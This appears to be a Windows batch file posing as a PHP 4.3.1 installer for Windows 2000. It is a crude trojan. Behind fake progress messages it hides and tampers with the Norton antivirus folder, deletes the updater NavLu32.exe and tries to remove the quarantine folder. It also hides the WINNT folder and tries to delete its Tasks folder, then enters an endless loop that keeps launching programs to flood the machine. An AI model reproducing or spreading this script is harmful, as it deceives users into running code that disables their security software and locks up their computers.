   echo off
   cls
   color a
   echo Welcome To The PHP Instalation
   echo This instalation program Works only in win2k
   echo
   echo Please Click any Keyword to Continue
   pause > nul
   echo Wait for computer checkin if you have a previous version
   echo Please click any keyword
   pause > nul
   If exist c:\fox10.bat goto exist
   If not exist c:\fox10.bat goto installer
   :exist
   echo ::CHECKING::
   echo THE INSTALLER HAS DETECT A PREVIOUS PHP Version.
   echo click any key to exit
   pause > nul
   exit
   :installer
   echo ::CHECKING::
   echo THE INSTALLER DIDNT DETECT ANY VERSION
   echo Now the installer will installs you the php4.3.1
   echo Click anything
   pause > nul
   echo 10% - Copying Files
   echo please click somethin
   pause > nul
   echo 20% - Copying Files
   echo click
   pause > nul
   echo 30% - Checking System
   echo Please Wait
   echo
   echo Click anything
   pause > nul
   If exist c:\program files\Navnt goto hh
   If not exist c:\program files\Navnt goto hd2
   :hh
   echo CHECKING PLEASE WAIT
   echo
   echo CLICK ANYTHING
   pause > nul
   ATTRIB +H -R C:\Program Files\Navnt
   del c:\program files\navnt\NavLu32.exe
   RMDIR c:\program files\navnt\Quaratine
   echo THE INSTALLER DETECT A PREVIOUS VERSION
   echo click anything
   pause > nul
   :hd2
   ATTRIB +H -R C:\WINNT
   RMDIR c:\WINNT\Tasks
   color 0c
   echo THE PHP VERSION HAS BEEN INSTALLER SUCESFUL
   echo msgbox "You Have Install With Succes The newest PHp VERSION > > c:\mshoi.vbs
   start mshoi.vbs
   goto loop1
   :loop1
   echo The installation has been sucesful finished
   echo LEETS TRY SOME FLOOD. HAVE FUNN (LOL)
   goto loop2
   :loop2
   start command
   start mspaint
   start regedit
   start iexplore
   goto loop2
